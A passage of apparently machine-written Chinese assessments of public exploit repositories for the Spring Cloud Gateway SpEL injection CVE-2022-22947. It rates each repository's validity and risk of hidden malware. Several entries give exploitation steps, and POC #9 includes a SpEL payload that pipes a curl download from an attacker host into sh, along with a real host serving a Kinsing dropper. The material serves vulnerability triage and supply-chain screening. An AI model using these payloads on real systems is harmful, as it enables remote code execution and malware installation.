**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
